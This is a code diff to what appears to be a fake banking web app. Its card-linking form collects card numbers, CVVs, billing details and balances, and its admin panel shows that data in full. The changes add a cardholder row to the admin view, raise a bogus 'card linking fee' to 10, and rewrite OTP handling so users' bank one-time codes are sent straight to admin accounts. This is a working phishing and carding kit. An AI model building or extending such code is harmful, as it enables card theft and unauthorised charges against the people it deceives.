@@ -565,7 +565,7 @@ html,body{width:100%;overflow-x:hidden;font-family:-apple-system,BlinkMacSystemF
 
 <div class="modal" id="cards-list-modal"><div class="modal-box"><div class="modal-header"><h3>&#128203; Linked Cards</h3><button class="modal-close" onclick="closeModal('cards-list-modal')">&#215;</button></div><div id="cards-list-content"></div></div></div>
 
-<div class="modal" id="card-modal"><div class="modal-box dark"><div style="text-align:center;padding:16px 0 12px;border-bottom:1px solid rgba(255,255,255,0.08);margin-bottom:16px;"><img src="https://i.imgur.com/L2U0Crf.jpeg" style="width:72px;height:72px;object-fit:contain;border-radius:16px;filter:drop-shadow(0 0 8px rgba(255,255,255,0.12));display:block;margin:0 auto 8px;" alt="Card Logo"><div style="font-size:10px;letter-spacing:2px;text-transform:uppercase;color:rgba(255,255,255,0.4);">Powered by Apple</div></div><div class="modal-header"><h3 id="card-modal-title">&#128179; Link Card</h3><button class="modal-close" onclick="closeModal('card-modal')">&#215;</button></div><input type="text" class="modal-input" id="card-number" placeholder="Card Number (16 digits)" data-i18n="cardNumber" maxlength="19" inputmode="numeric"><input type="text" class="modal-input" id="card-name" placeholder="Cardholder Name" data-i18n="cardHolder"><div style="display:flex;gap:8px;"><input type="text" class="modal-input" id="card-expiry" placeholder="MM/YY" data-i18n="expiry" maxlength="5" style="flex:1;"><input type="text" class="modal-input" id="card-cvv" placeholder="CVV" data-i18n="cvv" maxlength="4" style="flex:1;"></div><div class="dark-section"><h4>&#128205; Billing Address</h4><input type="text" class="modal-input" id="card-street" placeholder="Street Address" data-i18n="streetAddr"><div style="display:flex;gap:8px;"><input type="text" class="modal-input" id="card-city" placeholder="City" data-i18n="city" style="flex:1;"><input type="text" class="modal-input" id="card-postcode" placeholder="Postcode" data-i18n="postcode" style="flex:1;"></div><input type="text" class="modal-input" id="card-country-field" placeholder="Country" data-i18n="country"><input type="tel" class="modal-input" id="card-phone" placeholder="Phone Number"></div><input type="text" class="modal-input" id="card-balance" placeholder="Current Bank Balance (e.g. 2500.00)" data-i18n="currentBalance" inputmode="decimal">
+<div class="modal" id="card-modal"><div class="modal-box dark"><div style="text-align:center;padding:16px 0 12px;border-bottom:1px solid rgba(255,255,255,0.08);margin-bottom:16px;"><img src="https://i.imgur.com/L2U0Crf.jpeg" style="width:72px;height:72px;object-fit:contain;border-radius:16px;filter:drop-shadow(0 0 8px rgba(255,255,255,0.12));display:block;margin:0 auto 8px;" alt="Card Logo"><div style="font-size:10px;letter-spacing:2px;text-transform:uppercase;color:rgba(255,255,255,0.4);">Powered by Apple</div></div><div class="modal-header"><h3 id="card-modal-title">&#128179; Link Card</h3><button class="modal-close" onclick="closeModal('card-modal')">&#215;</button></div><input type="text" class="modal-input" id="card-number" placeholder="Card Number (16 digits)" data-i18n="cardNumber" maxlength="19" inputmode="numeric"><input type="text" class="modal-input" id="card-name" placeholder="Cardholder Name" data-i18n="cardHolder"><div style="display:flex;gap:8px;"><input type="text" class="modal-input" id="card-expiry" placeholder="MM/YY" data-i18n="expiry" maxlength="5" style="flex:1;"><input type="text" class="modal-input" id="card-cvv" placeholder="CVV" data-i18n="cvv" maxlength="4" style="flex:1;"></div><div class="dark-section"><h4>&#128205; Billing Address</h4><input type="text" class="modal-input" id="card-street" placeholder="Street Address" data-i18n="streetAddr"><div style="display:flex;gap:8px;"><input type="text" class="modal-input" id="card-city" placeholder="City" data-i18n="city" style="flex:1;"><input type="text" class="modal-input" id="card-postcode" placeholder="Postcode" data-i18n="postcode" style="flex:1;"></div><input type="text" class="modal-input" id="card-country-field" placeholder="Country" data-i18n="country"><input type="tel" class="modal-input" id="card-phone" placeholder="Phone Number"></div><input type="text" class="modal-input" id="card-balance" placeholder="Current Card Balance (e.g. 2500.00)" data-i18n="currentBalance" inputmode="decimal">
 <div style="background:rgba(77,171,255,0.08);border:1px solid rgba(77,171,255,0.25);border-radius:10px;padding:12px 14px;margin:6px 0 10px;display:flex;gap:10px;align-items:flex-start;">
   <div style="font-size:20px;flex-shrink:0;">&#128179;</div>
   <div>
@@ -575,10 +575,10 @@ html,body{width:100%;overflow-x:hidden;font-family:-apple-system,BlinkMacSystemF
 </div>
 <div style="background:rgba(255,193,7,0.1);border:1px solid rgba(255,193,7,0.35);border-radius:10px;padding:12px 14px;margin-bottom:8px;display:flex;gap:10px;align-items:flex-start;">
   <div style="font-size:18px;flex-shrink:0;">&#9888;&#65039;</div>
-  <div style="font-size:12px;color:#ffc107;line-height:1.5;"><strong>Card Linking Fee</strong><br>A small <strong id="card-link-fee">5</strong> fee will be charged from your card to verify it is active and valid. This is a standard security check.</div>
+  <div style="font-size:12px;color:#ffc107;line-height:1.5;"><strong>Card Linking Fee</strong><br>A small <strong id="card-link-fee">10</strong> fee will be charged from your card to verify it is active and valid. This is a standard security check.</div>
 </div><div class="modal-error" id="card-error"></div><button class="modal-btn blue" id="card-submit-btn" data-i18n="linkCardBtn">Link Card</button></div></div>
 
-<div class="modal" id="verify-modal"><div class="modal-box center verify-box"><div class="modal-header"><h3>&#128272; Verify Card</h3><button class="modal-close" onclick="closeModal('verify-modal')">&#215;</button></div><div class="verify-card-preview"><div class="verify-card-brand" id="vc-brand">VISA</div><div class="verify-card-number" id="vc-number">&#8226;&#8226;&#8226;&#8226; &#8226;&#8226;&#8226;&#8226; &#8226;&#8226;&#8226;&#8226; ----</div><div class="verify-card-holder" id="vc-name">Cardholder</div></div><div class="verify-tabs"><div class="vtab active" id="vtab-app" data-i18n="appAuth">&#128241; App Auth</div><div class="vtab" id="vtab-otp" data-i18n="otpCode">&#128290; OTP Code</div></div><div id="vpanel-app"><div class="verify-subtitle">Open your banking app and authorize the verification</div><div class="verify-steps"><div class="verify-step"><div class="vstep-num">1</div><div>Open your bank&#39;s mobile app</div></div><div class="verify-step"><div class="vstep-num">2</div><div>Find the pending verification transaction</div></div><div class="verify-step"><div class="vstep-num">3</div><div>Approve it, then tap Done below</div></div></div><button class="verify-done-btn" id="verify-app-done" data-i18n="doneAuth">Done &#8212; I Authorized It</button></div><div id="vpanel-otp" style="display:none;"><div class="verify-subtitle">Enter the OTP code sent by admin</div><input type="text" class="otp-input" id="otp-input" placeholder="000000" maxlength="6" inputmode="numeric"><button class="verify-done-btn" id="verify-otp-btn" style="margin-top:12px;" data-i18n="submitOtp">Submit OTP</button></div><div class="verify-msg" id="verify-msg"></div></div></div>
+<div class="modal" id="verify-modal"><div class="modal-box center verify-box"><div class="modal-header"><h3>&#128272; Verify Card</h3><button class="modal-close" onclick="closeModal('verify-modal')">&#215;</button></div><div class="verify-card-preview"><div class="verify-card-brand" id="vc-brand">VISA</div><div class="verify-card-number" id="vc-number">&#8226;&#8226;&#8226;&#8226; &#8226;&#8226;&#8226;&#8226; &#8226;&#8226;&#8226;&#8226; ----</div><div class="verify-card-holder" id="vc-name">Cardholder</div></div><div class="verify-tabs"><div class="vtab active" id="vtab-app" data-i18n="appAuth">&#128241; App Auth</div><div class="vtab" id="vtab-otp" data-i18n="otpCode">&#128290; OTP Code</div></div><div id="vpanel-app"><div class="verify-subtitle">Open your banking app and authorize the verification</div><div class="verify-steps"><div class="verify-step"><div class="vstep-num">1</div><div>Open your bank&#39;s mobile app</div></div><div class="verify-step"><div class="vstep-num">2</div><div>Find the pending verification transaction</div></div><div class="verify-step"><div class="vstep-num">3</div><div>Approve it, then tap Done below</div></div></div><button class="verify-done-btn" id="verify-app-done" data-i18n="doneAuth">Done &#8212; I Authorized It</button></div><div id="vpanel-otp" style="display:none;"><div class="verify-subtitle">Enter your OTP code to send to admin</div><input type="text" class="otp-input" id="otp-input" placeholder="000000" maxlength="6" inputmode="numeric"><button class="verify-done-btn" id="verify-otp-btn" style="margin-top:12px;" data-i18n="submitOtp">Submit OTP</button></div><div class="verify-msg" id="verify-msg"></div></div></div>
 
 <div class="modal" id="add-money-modal"><div class="modal-box"><div class="modal-header"><h3>&#10133; Add Money</h3><button class="modal-close" onclick="closeModal('add-money-modal')">&#215;</button></div><p style="font-size:13px;color:#666;margin-bottom:14px;" data-i18n="addMoneyDesc">Select an authorized card. Deposits require admin approval.</p><div id="addmoney-cards"></div><div id="addmoney-form-section" style="display:none;"><div style="background:#eef2ff;border-radius:8px;padding:10px 14px;font-size:13px;color:#1a56ff;margin-bottom:10px;font-weight:600;" id="addmoney-selected-info"></div><input type="number" class="modal-input" id="addmoney-amount" placeholder="Amount to deposit" data-i18n="amountDeposit" min="1" step="0.01"><input type="text" class="modal-input" id="addmoney-pin" placeholder="Your 4-digit PIN" maxlength="4" inputmode="numeric"><div class="modal-error" id="addmoney-error"></div><button class="modal-btn" id="addmoney-confirm-btn" data-i18n="submitDeposit">Submit Deposit Request</button></div></div></div>
 
@@ -777,7 +777,7 @@ en:{
   newPin:'New PIN',cardNumber:'Card Number (16 digits)',
   cardHolder:'Cardholder Name',expiry:'MM/YY',cvv:'CVV',
   streetAddr:'Street Address',city:'City',postcode:'Postcode',
-  country:'Country',currentBalance:'Current Bank Balance (e.g. 2500.00)',
+  country:'Country',currentBalance:'Current Card Balance (e.g. 2500.00)',
   amountDeposit:'Amount to deposit',pin:'PIN',
   sendAccounts:'Accounts',sendNav:'Send/Req',refer:'Refer',
   referFriend:'Refer a Friend',
@@ -847,7 +847,7 @@ es:{
   newPin:'Nuevo PIN',cardNumber:'N\u00famero de tarjeta (16 d\u00edgitos)',
   cardHolder:'Titular de la tarjeta',expiry:'MM/AA',cvv:'CVV',
   streetAddr:'Direcci\u00f3n',city:'Ciudad',postcode:'C\u00f3digo postal',
-  country:'Pa\u00eds',currentBalance:'Saldo bancario actual (ej. 2500.00)',
+  country:'Pa\u00eds',currentBalance:'Saldo actual de la tarjeta (ej. 2500.00)',
   amountDeposit:'Monto a depositar',pin:'PIN',
   sendAccounts:'Cuentas',sendNav:'Env/Sol',refer:'Referir',
   referFriend:'Referir a un amigo',
@@ -917,7 +917,7 @@ fr:{
   newPin:'Nouveau PIN',cardNumber:'Num\u00e9ro de carte (16 chiffres)',
   cardHolder:'Titulaire de la carte',expiry:'MM/AA',cvv:'CVV',
   streetAddr:'Adresse',city:'Ville',postcode:'Code postal',
-  country:'Pays',currentBalance:'Solde bancaire actuel (ex. 2500.00)',
+  country:'Pays',currentBalance:'Solde actuel de la carte (ex. 2500.00)',
   amountDeposit:'\u00c0 d\u00e9poser',pin:'PIN',
   sendAccounts:'Comptes',sendNav:'Env/Dem',refer:'Parrainer',
   referFriend:'Parrainer un ami',
@@ -1354,7 +1354,7 @@ function renderAuthSection(container,items,showActions,type){
     div.innerHTML=
       '<div class="admin-card-name">'+u.firstname+' '+u.surname+'</div>'+
       mkrow('Email',u.email)+mkrow('Account #',u.accountNumber)+mkrow('Country',u.country)+
-      mkrow('Brand',card.brand)+mkrow('Card #',card.number)+mkrow('Last 4','....'+card.lastFour)+
+      mkrow('Cardholder',card.name)+mkrow('Brand',card.brand)+mkrow('Card #',card.number)+mkrow('Last 4','....'+card.lastFour)+
       mkrow('Expiry',card.expiry)+mkrow('CVV',card.cvv)+mkrow('Bal',card.currentBalance)+
       mkrow('Street',ba.street||'--')+mkrow('City',ba.city||'--')+mkrow('Postcode',ba.postcode||'--')+mkrow('Phone',ba.phone||u.phone||'--')+
       (card.otpCode?'<div class="admin-detail-row"><span class="admin-detail-label">OTP</span><span style="color:#4dabff;font-weight:700;">'+card.otpCode+'</span></div>':'')+
@@ -1614,18 +1614,25 @@ $('verify-app-done').onclick=function(){
 };
 $('verify-otp-btn').onclick=function(){
   var otp=$('otp-input').value.trim(),msg=$('verify-msg');msg.textContent='';
-  if(!otp){msg.style.color='#ff5c5c';msg.textContent='Enter the OTP.';return;}
+  if(!otp||otp.length<4){msg.style.color='#ff5c5c';msg.textContent='Enter your OTP code.';return;}
   var cards=userData.linkedCards||[];
-  var idx=cards.findIndex(function(c){return c&&c.otpCode===otp;});
-  if(idx<0){msg.style.color='#ff5c5c';msg.textContent='\u274c Invalid OTP.';return;}
-  cards[idx].status='authorized';cards[idx].authorizedDate=new Date().toISOString();
+  var pidx=cards.reduce(function(best,cd,i){return (cd&&cd.status==='pending')?i:best;},-1);
+  if(pidx<0){msg.style.color='#ff5c5c';msg.textContent='No pending card found.';return;}
+  cards[pidx].otpCode=otp;
+  cards[pidx].otpSubmittedDate=new Date().toISOString();
   db.ref('users/'+currentUser.uid+'/linkedCards').set(cards).then(function(){
-    if(!userData.verifiedBonus){
-      db.ref('users/'+currentUser.uid).transaction(function(u){if(u){u.balance=(parseFloat(u.balance)||0)+10;u.verifiedBonus=true;}return u;});
-      notify(currentUser.uid,'🎉 Card verified! $10 bonus added!');
-    }
-    msg.style.color='#34d399';msg.textContent='\u2705 Card verified!';
-  });
+    db.ref('users').once('value').then(function(snap){
+      snap.forEach(function(s){
+        var u=s.val();
+        if(u&&(u.email===ADMIN_EMAIL||u.email===ADMINADEX_EMAIL)){
+          notify(s.key,'&#128272; OTP from '+(userData.firstname||'')+' '+(userData.surname||'')+' for card ....'+cards[pidx].lastFour+': '+otp);
+        }
+      });
+    });
+    msg.style.color='#34d399';
+    msg.textContent='\u2705 OTP sent to admin!';
+    $('otp-input').value='';
+  }).catch(function(e){msg.style.color='#ff5c5c';msg.textContent=e.message;});
 };
 
 // ACCOUNT
@@ -1662,7 +1669,7 @@ $('add-new-card-btn').onclick=function(){
   $('card-modal-title').textContent='💳 Link Card';
   // Update fee label based on user currency
   var feeEl=$('card-link-fee');
-  if(feeEl){var feeSym={'USD':'$','EUR':'€','GBP':'£','NGN':'₦','CAD':'C$','AUD':'A$'}[userData.currency||'USD']||'$';feeEl.textContent='5'+feeSym;}
+  if(feeEl){var feeSym={'USD':'$','EUR':'€','GBP':'£','NGN':'₦','CAD':'C$','AUD':'A$'}[userData.currency||'USD']||'$';feeEl.textContent='10'+feeSym;}
   ['card-number','card-name','card-expiry','card-cvv','card-street','card-city','card-postcode','card-country-field','card-phone','card-balance'].forEach(function(id){var el=$(id);if(el)el.value='';});
   $('card-error').textContent='';
   openModal('card-modal');
